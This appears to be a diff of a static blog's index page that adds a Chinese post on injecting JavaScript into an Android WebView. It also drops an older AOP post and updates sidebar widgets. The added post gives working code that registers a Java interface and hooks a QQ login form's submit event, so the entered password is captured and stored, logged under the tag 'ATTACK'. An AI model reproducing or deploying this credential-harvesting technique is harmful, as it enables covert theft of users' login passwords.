@@ -63,6 +63,52 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-WebViewJS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/03/16/WebViewJS/" class="article-date">
+  <time datetime="2015-03-16T07:23:30.000Z" itemprop="datePublished">2015-03-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/03/16/WebViewJS/">在WebView中添加JS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>首先向WebView注入Java对象，在WebView加载完毕的时候执行一段js，给表单提交事件关联上我们的代码，即让表单提交的时候执行所注入的Java对象的一个方法，js执行我们的方法的时候可以把qq号和密码作为参数传递过来，然后我们就可以保存了。下面的步骤只示范如何把qq密码存下来。</p>
+<p>1. 声明要注入的Java对象</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SavePasswordJavaScriptInterface</span>    </span></div><div class="line">{    </div><div class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">savePassword</span>(<span class="keyword">final</span> String password)  </div><div class="line">    {    </div><div class="line">        Log.w(<span class="string">"ATTACK"</span>, <span class="string">"enter spjsinterface:"</span>+ password);  </div><div class="line">        mHandler.post(<span class="keyword">new</span> Runnable()  </div><div class="line">        {    </div><div class="line">            <span class="annotation">@Override</span>    </div><div class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>()  </div><div class="line">            {  </div><div class="line">                <span class="comment">//这里就是用户登录的密码了，你可以存起来了  </span></div><div class="line">                mPassword = password;  </div><div class="line">                Log.w(<span class="string">"ATTACK"</span>, mPassword);  </div><div class="line">            }    </div><div class="line">        });    </div><div class="line">    }   </div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>2. 注入上述对象</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这里是注入Java对象  </span></div><div class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> SavePasswordJavaScriptInterface(), <span class="string">"SPJSInterface"</span>);  </div><div class="line"><span class="comment">//这里是打开登录平台页面  </span></div><div class="line">mWebView.loadUrl(LOGIN_URL);</div></pre></td></tr></table></figure>
+
+<p>3. 在WebViewClient中的onPageFinished方法中注入js，这样当登录的时候就会调用我们之前注入的Java对象，同时乖乖地把密码作为参数传过来</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="annotation">@Override</span>  </div><div class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPageFinished</span>(WebView view, String url)  </div><div class="line">{  </div><div class="line">    <span class="keyword">super</span>.onPageFinished(view, url);  </div><div class="line">    <span class="comment">//仅当是登录url的时候才注入我们的js，不要任何url都注入  </span></div><div class="line">    <span class="keyword">if</span> (url.equals(LOGIN_URL)) {  </div><div class="line">        <span class="comment">//要注入的js  </span></div><div class="line">        String js = <span class="string">"document.forms[0].onsubmit=function(event){var pwd = document.getElementById(\"ptlogin-password\").value;window.SPJSInterface.savePassword(pwd);return false;}"</span>;  </div><div class="line">        Log.w(<span class="string">"ATTACK"</span>, <span class="string">"inject js, js= "</span> + js);  </div><div class="line">        view.loadUrl(<span class="string">"javascript:"</span> + js);  </div><div class="line">    }  </div><div class="line">}</div></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yzx41099298.github.io/2015/03/16/WebViewJS/" data-id="2ln9ndjqtku1yiry" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-TouchEvent" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2015/03/13/TouchEvent/" class="article-date">
@@ -609,49 +655,6 @@
 
 
   
-    <article id="post-aop" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/03/11/aop/" class="article-date">
-  <time datetime="2015-03-11T08:54:35.000Z" itemprop="datePublished">2015-03-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/03/11/aop/">AOP</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>AOP即面向切面编程。AspectJ是AOP最早成熟的Java实现，它稍微扩展了一下Java语言，增加了一些Keyword:</p>
-<ul>
-<li>Aspect:用来定义切面，该切面可以包含多个切入点和通知，而且标签内部的通知和切入点定义是无序的</li>
-<li>Pointcut:表示一个切入点或触发点，切入点支持的切入点指示符有几种，execution表示执行点，call表示调用点</li>
-<li>execution：使用“execution(方法表达式)”匹配方法执行，方法表达式的格式（注解？ 修饰符? 返回值类型 类型声明?方法名(参数列表) 异常列表？）</li>
-<li>Advice：Pointcut被触发，所产生相应的动作。Advice在AspectJ有三种：before、 after、Around（调用先后均执行）</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yzx41099298.github.io/2015/03/11/aop/" data-id="7l6wrjcenj1n97c4" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -671,7 +674,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a><span class="archive-list-count">11</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a><span class="archive-list-count">12</span></li></ul>
     </div>
   </div>
 
@@ -681,6 +684,10 @@
     <h3 class="widget-title">Recents</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2015/03/16/WebViewJS/">在WebView中添加JS</a>
+          </li>
         
           <li>
             <a href="/2015/03/13/TouchEvent/">TouchEvent派发机制</a>
@@ -696,10 +703,6 @@
         
           <li>
             <a href="/2015/03/11/maven/">使用Gradle编译链，在Github上托管一个Maven资源库。</a>
-          </li>
-        
-          <li>
-            <a href="/2015/03/11/Fromhtml/">Html.fromhtml 方法支持的参数</a>
           </li>
         
       </ul>
